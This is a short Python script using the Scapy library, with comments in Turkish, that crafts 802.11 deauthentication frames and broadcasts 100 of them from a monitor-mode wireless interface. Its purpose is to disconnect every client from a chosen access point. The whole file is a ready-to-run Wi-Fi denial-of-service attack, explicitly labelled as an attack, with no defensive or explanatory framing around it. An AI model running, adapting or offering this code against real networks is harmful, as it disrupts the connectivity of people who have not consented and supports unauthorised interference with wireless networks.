from scapy.all import *

def deauth_attack(target_mac, ap_mac, interface):
    # Deauth saldırısı için bir Dot11 çerçevesi oluşturuluyor.
    dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    # Deauth paketi oluşturuluyor. (reason=7, IEEE standardında bir sebep kodudur.)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    # Saldırı paketi .
    print(f"Sending Deauth to {target_mac} from {ap_mac}")
    sendp(packet, iface=interface, count=100, inter=.1)

if __name__ == "__main__":
    target_mac = "FF:FF:FF:FF:FF:FF"  # Hedef cihazın MAC adresi (broadcast olarak ayarlandı.)
    ap_mac = "AA:BB:CC:DD:EE:FF"  # Hedef AP'nin MAC adresi
    interface = "wlan0mon"  # Monitor modunda çalışacak olan ağ arabirimi
    deauth_attack(target_mac, ap_mac, interface)
